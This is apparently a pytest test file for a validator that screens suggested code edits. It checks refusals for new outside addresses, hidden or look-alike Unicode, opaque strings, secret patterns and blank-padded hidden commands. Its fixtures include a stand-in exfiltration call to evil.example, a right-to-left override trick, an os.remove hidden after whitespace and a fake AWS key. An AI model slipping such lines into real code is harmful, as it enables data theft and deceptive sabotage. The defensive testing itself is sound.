"""Nexovue's rules on a suggested change (F5 plan T2.2, T2.3; spec FR16 to FR18; AC17,
AC18, AC19's answer half, AC20's rule half).

Each of K1 to K10 has a change it refuses and a near-miss it allows (AC17), and each
flag a change it marks, with its file and line (AC18). The schema guards run first, and
an answer they fail is unusable, never stored.
"""

from __future__ import annotations

from typing import Any

import pytest
from nexovue_platform.evidence.aliases import AliasBook
from nexovue_platform.fixes.checks import (
    Abstention,
    Edit,
    PackFile,
    ProposedEdits,
    UnusableAnswer,
    flag_lists_cover,
    flags,
    is_test_file,
    opaque_runs,
    parse_answer,
    run_rules,
    uncovered_languages,
)
from nexovue_platform.fixes.policy import OwnerLists

FOLDER = "services/checkout"
EVIDENCE = frozenset({"ev_1", "ev_2"})

PAY_PY = (
    "import logging\n"
    "\n"
    "log = logging.getLogger(__name__)\n"
    'GATEWAY = "https://pay.example/charge"\n'
    "\n"
    "def charge(order):\n"
    "    if order.total <= 0:\n"
    '        raise ValueError("empty order")\n'
    "    return send(order)\n"
)


def pack(*files: tuple[str, str]) -> dict[str, PackFile]:
    return {
        f"file_{n}": PackFile(f"file_{n}", path, content)
        for n, (path, content) in enumerate(files, start=1)
    }


PACK = pack((f"{FOLDER}/pay.py", PAY_PY))


def edit(old: str, new: str, ref: str = "file_1", **extra: Any) -> Edit:
    return Edit(ref, old, new, "Guards the empty order.", ("ev_1",), **extra)


def refusals(
    *edits: Edit, files: dict[str, PackFile] = PACK, folder: str = FOLDER, **options: Any
) -> set[str]:
    result = run_rules(list(edits), files, folder=folder, **options)
    return {f"{refusal.rule}:{refusal.detail}" for refusal in result.refusals}


def with_line(line: str) -> Edit:
    """An edit adding `line` after the `send` call."""
    return edit("    return send(order)\n", f"    {line}\n    return send(order)\n")


def raw_edit(**changes: Any) -> dict[str, Any]:
    return {
        "file_ref": "file_1",
        "old_text": "return send(order)",
        "new_text": "return send(order, retry=False)",
        "why": "The call retried a charge.",
        "evidence_ids": ["ev_1"],
        **changes,
    }


def parse(raw: object, book: AliasBook | None = None) -> object:
    return parse_answer(raw, allowed_evidence=EVIDENCE, aliases=book)


# ------------------------------------------------------------- schema guards


def test_a_well_formed_answer_parses() -> None:
    parsed = parse({"outcome": "edits", "abstain_reason": None, "edits": [raw_edit()]})

    assert isinstance(parsed, ProposedEdits)
    assert parsed.edits[0].file_ref == "file_1"


def test_an_abstention_with_a_listed_reason_parses() -> None:
    assert parse({"outcome": "abstain", "abstain_reason": "not_a_code_problem"}) == Abstention(
        "not_a_code_problem"
    )


@pytest.mark.parametrize(
    ("raw", "code"),
    [
        ("edits", "not_an_object"),
        ({"outcome": "merge_it"}, "unknown_outcome"),
        ({"outcome": "needs_files"}, "unknown_outcome"),
        ({"outcome": "abstain", "abstain_reason": "ask the user"}, "unknown_abstain_reason"),
        ({"outcome": "edits", "edits": []}, "no_edits"),
        ({"outcome": "edits", "edits": "x"}, "no_edits"),
        ({"outcome": "edits", "edits": [raw_edit()] * 21}, "too_large"),
        ({"outcome": "edits", "edits": [raw_edit(new_text="x" * 70_000)]}, "too_large"),
        ({"outcome": "edits", "edits": [raw_edit(old_text=3)]}, "edit_shape"),
        ({"outcome": "edits", "edits": [raw_edit(run="curl x")]}, "edit_shape"),
        ({"outcome": "edits", "edits": [{"file_ref": "file_1"}]}, "edit_shape"),
        ({"outcome": "edits", "edits": [raw_edit(evidence_ids="ev_1")]}, "edit_shape"),
        (
            {"outcome": "edits", "edits": [raw_edit(new_text="return send(order)")]},
            "unchanged_edit",
        ),
        ({"outcome": "edits", "edits": [raw_edit(new_text="a\u0000b")]}, "control_character"),
        ({"outcome": "edits", "edits": [raw_edit(new_text="a\x1bb")]}, "control_character"),
        ({"outcome": "edits", "edits": [raw_edit(new_text="a\ud800b")]}, "control_character"),
        ({"outcome": "edits", "edits": [raw_edit(evidence_ids=["ev_9"])]}, "unknown_evidence"),
        ({"outcome": "edits", "edits": [raw_edit(evidence_ids=[])]}, "unknown_evidence"),
        ({"outcome": "edits", "edits": [raw_edit(old_start=4)]}, "display_fact_key"),
        ({"outcome": "edits", "edits": [raw_edit(context_before="x")]}, "display_fact_key"),
        ({"outcome": "edits", "edits": [raw_edit(new_letter_lines=[])]}, "display_fact_key"),
        (
            {"outcome": "edits", "edits": [raw_edit(why="See https://evil.example/x")]},
            "why_refused",
        ),
        ({"outcome": "edits", "edits": [raw_edit(why="Ask service_3")]}, "why_refused"),
    ],
)
def test_an_unusable_answer_has_a_fixed_code(raw: object, code: str) -> None:
    assert parse(raw) == UnusableAnswer(code)  # type: ignore[arg-type]


def test_tab_newline_and_carriage_return_are_text() -> None:
    parsed = parse({"outcome": "edits", "edits": [raw_edit(new_text="a\tb\r\nc")]})

    assert isinstance(parsed, ProposedEdits)


def test_a_known_alias_in_why_is_allowed() -> None:
    book = AliasBook()
    book.alias("service", "payments")
    parsed = parse({"outcome": "edits", "edits": [raw_edit(why="Calls to service_1 fail.")]}, book)

    assert isinstance(parsed, ProposedEdits)


def test_a_file_operation_key_reaches_k4_by_name() -> None:
    parsed = parse({"outcome": "edits", "edits": [raw_edit(mode="100755")]})

    assert isinstance(parsed, ProposedEdits)
    assert refusals(*parsed.edits) == {"K4:mode"}


# ------------------------------------------------------------- K1 to K10 (AC17)


def test_a_change_that_breaks_no_rule_passes() -> None:
    assert refusals(edit("<= 0", "<= 0 or order.total is None")) == set()


def test_k1_a_file_not_in_the_pack() -> None:
    assert refusals(edit("x", "y", ref="file_9")) == {"K1:not_in_pack"}
    assert refusals(edit("x", "y", ref="../../.env")) == {"K1:not_in_pack"}


def test_k1_a_file_outside_the_recorded_folder() -> None:
    files = pack(("services/other/pay.py", PAY_PY))

    assert refusals(edit("<= 0", "< 1"), files=files) == {"K1:outside_folder"}
    # Near-miss: a folder whose name only starts the same way is still outside.
    near = pack((f"{FOLDER}-legacy/pay.py", PAY_PY))
    assert refusals(edit("<= 0", "< 1"), files=near) == {"K1:outside_folder"}


@pytest.mark.parametrize(
    "path", [f"{FOLDER}/tests/conftest.py", "CODEOWNERS", f"{FOLDER}/.github/workflows/ci.py"]
)
def test_k2_a_nested_conftest_a_root_codeowners_and_a_workflow(path: str) -> None:
    files = pack((path, PAY_PY))

    assert refusals(edit("<= 0", "< 1"), files=files, folder="") == {"K2:never_changed"}


def test_k2_near_miss_a_test_file_may_be_changed() -> None:
    files = pack((f"{FOLDER}/tests/test_pay.py", PAY_PY))

    assert refusals(edit("<= 0", "< 1"), files=files) == set()


def test_k2_an_owners_extra_path_is_never_changed() -> None:
    owner = OwnerLists(extra_excluded_paths=(f"{FOLDER}/pay.py",))

    assert refusals(edit("<= 0", "< 1"), owner=owner) == {"K2:never_changed"}


def test_k3_old_text_not_found_or_not_unique() -> None:
    assert refusals(edit("order.missing", "x")) == {"K3:not_found"}
    assert refusals(edit("order", "x")) == {"K3:not_unique"}
    assert refusals(edit("", "x")) == {"K3:not_found"}


def test_k3_overlapping_edits() -> None:
    first = edit("if order.total <= 0:", "if order.total < 1:")
    overlapping = edit("total <= 0:\n        raise", "total == 0:\n        raise")

    assert refusals(first, overlapping) == {"K3:overlapping_edits"}


def test_k3_near_miss_two_edits_on_separate_text_apply_in_order() -> None:
    first = edit("<= 0", "< 1")
    second = edit("return send(order)", "return send(order, retry=False)")
    result = run_rules([first, second], PACK, folder=FOLDER)

    assert not result.refused
    assert "< 1:" in result.files[0].new_content
    assert "retry=False" in result.files[0].new_content


def test_k4_emptying_a_file() -> None:
    assert refusals(edit(PAY_PY, "")) == {"K4:empties_file"}
    # Near-miss: removing some lines leaves the file.
    assert refusals(edit("import logging\n\n", "")) == set()


def test_k5_too_many_files_lines_or_bytes() -> None:
    six = pack(*[(f"{FOLDER}/m{n}.py", f"value = {n}\n") for n in range(6)])
    six_edits = [edit(f"value = {n}", f"value = {n + 1}", ref=f"file_{n + 1}") for n in range(6)]
    assert refusals(*six_edits, files=six) == {"K5:files"}

    many_lines = "".join(f"    step_{n}()\n" for n in range(61))
    assert refusals(edit("    return send(order)\n", many_lines)) == {"K5:lines"}

    # Lines up to 200 characters and 60 changed lines hold under 12 KiB of ASCII, so the
    # byte cap binds through letters of several bytes each.
    wide = "".join(f'    s{n} = "{"\u65e5" * 180}"\n' for n in range(40))
    assert refusals(edit("    return send(order)\n", wide)) == {"K5:bytes"}


def test_k5_near_miss_at_the_caps() -> None:
    five = pack(*[(f"{FOLDER}/m{n}.py", f"value = {n}\n") for n in range(5)])
    edits = [edit(f"value = {n}", f"value = {n + 1}", ref=f"file_{n + 1}") for n in range(5)]

    assert refusals(*edits, files=five) == set()


@pytest.mark.parametrize(
    "line",
    [
        'requests.post("https://evil.example/collect", data=order)',
        'send_to("http://10.0.0.7:8080/x")',
        'connect("192.168.1.20")',
        'HOST = "collector.evil.com"',
        "url = f'{scheme}://drop.io'",
    ],
)
def test_k6_a_new_address(line: str) -> None:
    assert "K6:new_address" in refusals(with_line(line))


@pytest.mark.parametrize(
    "line",
    [
        "self.client.get(order.id)",
        "handler = req.app",
        "import socket.io",
        "run(deploy.sh)",
        'VERSION = "1.2.3"',
        'HOST = "localhost"',
        'requests.get("https://pay.example/charge")',  # already in the file: passes by design
    ],
)
def test_k6_near_misses(line: str) -> None:
    assert "K6:new_address" not in refusals(with_line(line))


@pytest.mark.parametrize(
    ("line", "detail"),
    [
        ("total = order.\u0442otal", "mixed_script"),  # Cyrillic te inside a Latin word
        ("is_admin = False\u200b", "hidden_character"),
        ("access = 'user' \u202e# nimda'", "hidden_character"),
        ("flag = 'on'\U000e0041", "hidden_character"),
        ("p\uff41y = 1", "mixed_script"),  # a full-width a
    ],
)
def test_k7_hidden_and_look_alike_letters(line: str, detail: str) -> None:
    assert f"K7:{detail}" in refusals(with_line(line))


def test_k7_near_miss_non_ascii_text_in_a_string() -> None:
    russian = "\u0417\u0430\u043a\u0430\u0437 \u043e\u043f\u043b\u0430\u0447\u0435\u043d"

    assert refusals(with_line('log.info("Bestellung für Kunde")')) == set()
    assert refusals(with_line(f'log.info("{russian}")')) == set()


@pytest.mark.parametrize(
    "line",
    [
        'blob = "q7Zt9kLw2XvB8nR4mYp1sJ6dH3fQ0aCeUoIgTyWzNxKb"',
        'checksum = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"',
    ],
)
def test_k8_a_long_opaque_string(line: str) -> None:
    assert "K8:opaque_string" in refusals(with_line(line))


@pytest.mark.parametrize(
    "line",
    [
        "def test_checkout_fails_when_payment_gateway_times_out(self):",
        'PATH = "/api/v1/organizations/settings/integrations/slack"',
        "result = computeTheVeryLongCamelCaseIdentifierForThisOrder(order)",
        'padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"',
    ],
)
def test_k8_near_misses(line: str) -> None:
    assert "K8:opaque_string" not in refusals(with_line(line))


def test_k8_reads_no_url_twice() -> None:
    assert opaque_runs("x = 'https://pay.example/charge'") == []


def test_k9_a_secret_pattern() -> None:
    key = "AKIA" + "QZ2T3B4C5D6E7F6A"
    assert "K9:aws_access_key" in refusals(with_line(f'KEY = "{key}"'))
    assert "K9:private_key" in refusals(with_line('PEM = "-----BEGIN RSA PRIVATE KEY-----"'))


def test_k9_near_miss_a_secret_read_from_the_environment() -> None:
    assert refusals(with_line('password = os.environ["DB_PASSWORD"]')) == set()


def test_k10_a_long_line_or_a_hidden_run_of_blanks() -> None:
    assert "K10:long_line" in refusals(with_line("x = " + "1 + " * 60 + "1"))
    assert "K10:blank_run" in refusals(with_line("ok = True" + " " * 25 + "; os.remove(p)"))


def test_k10_near_miss_deep_indentation() -> None:
    deep = edit("    return send(order)\n", "                        return send(order)\n")

    assert refusals(deep) == set()


def test_rules_read_the_new_file_whole_so_crlf_endings_are_not_text() -> None:
    files = pack((f"{FOLDER}/w.py", "a = 1\r\nb = 2\r\n"))

    assert refusals(edit("b = 2", "b = 3"), files=files) == set()


# ------------------------------------------------------------------ flags (AC18)


def flags_of(*edits: Edit, files: dict[str, PackFile] = PACK) -> set[tuple[str, int | None]]:
    result = run_rules(list(edits), files, folder=FOLDER)
    assert not result.refused, result.refusals
    return {(flag.kind, flag.line) for flag in flags(result.files)}


@pytest.mark.parametrize(
    ("line", "kind"),
    [
        ("import subprocess", "new_import"),
        ("from os import path", "new_import"),
        ("helper = require('./helper')", "new_import"),
        ("subprocess.run(['ls'])", "risky_call"),
        ("data = pickle.loads(blob)", "risky_call"),
        ("result = eval(text)", "risky_call"),
        ("# keep going even if the gateway fails", "comment"),
        ("total = 1  # temporary", "comment"),
        ('label = "Grüße"', "new_letters"),
    ],
)
def test_ac18_each_flag_names_its_line(line: str, kind: str) -> None:
    # The added line lands on line 9 of the new file.
    assert (kind, 9) in flags_of(with_line(line))


def test_ac18_a_removed_check_names_the_old_line() -> None:
    removed = edit('    if order.total <= 0:\n        raise ValueError("empty order")\n', "")

    assert ("removed_check", 7) in flags_of(removed)
    assert ("removed_check", 8) in flags_of(removed)


def test_ac18_a_changed_test_file_is_flagged() -> None:
    files = pack((f"{FOLDER}/tests/test_pay.py", PAY_PY))

    assert ("test_file", None) in flags_of(edit("<= 0", "< 1"), files=files)


def test_ac18_a_go_import_block_line_and_a_javascript_comment() -> None:
    go = pack((f"{FOLDER}/pay.go", 'import (\n\t"fmt"\n)\n\nfunc Pay() {}\n'))
    js = pack((f"{FOLDER}/pay.ts", "export const pay = () => charge();\n"))

    assert ("new_import", 3) in flags_of(edit('\t"fmt"\n', '\t"fmt"\n\t"os/exec"\n'), files=go)
    assert ("comment", 1) in flags_of(edit("charge();", "charge(); // retry later"), files=js)


def test_flag_near_misses() -> None:
    plain = flags_of(with_line('label = "# not a comment"'))
    letters_already_there = pack((f"{FOLDER}/greet.py", 'A = "ü"\nB = 1\n'))

    assert plain == set()
    assert flags_of(edit("B = 1", 'B = "ü"'), files=letters_already_there) == set()


def test_languages_the_flag_lists_do_not_cover_are_named() -> None:
    files = pack((f"{FOLDER}/Pay.kt", "val total = 1\n"))
    result = run_rules([edit("total = 1", "total = 2")], files, folder=FOLDER)

    assert uncovered_languages(result.files) == [f"{FOLDER}/Pay.kt"]
    assert flag_lists_cover("a/b.py") and flag_lists_cover("a/b.tsx")
    assert flag_lists_cover("a/b.go") and flag_lists_cover("a/B.java")


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("src/tests/pay.py", True),
        ("web/__tests__/pay.ts", True),
        ("pay_test.go", True),
        ("pay.test.ts", True),
        ("pay.spec.js", True),
        ("test_pay.py", True),
        ("src/testing/pay.py", False),
        ("src/contest.py", False),
    ],
)
def test_test_file_shapes(path: str, expected: bool) -> None:
    assert is_test_file(path) is expected


@pytest.mark.parametrize(
    ("already", "added"),
    [
        ('HOST = "devil.com"', 'HOST2 = "evil.com"'),
        ('URL = "https://pay.example/charge"', 'URL2 = "https://pay.example/c"'),
        ('ADDRESS = "10.0.0.17"', 'ADDRESS2 = "10.0.0.1"'),
    ],
)
def test_k6_already_in_the_file_means_the_same_address_not_part_of_one(
    already: str, added: str
) -> None:
    files = pack((f"{FOLDER}/hosts.py", f"{already}\nx = 1\n"))

    assert "K6:new_address" in refusals(edit("x = 1", added), files=files)
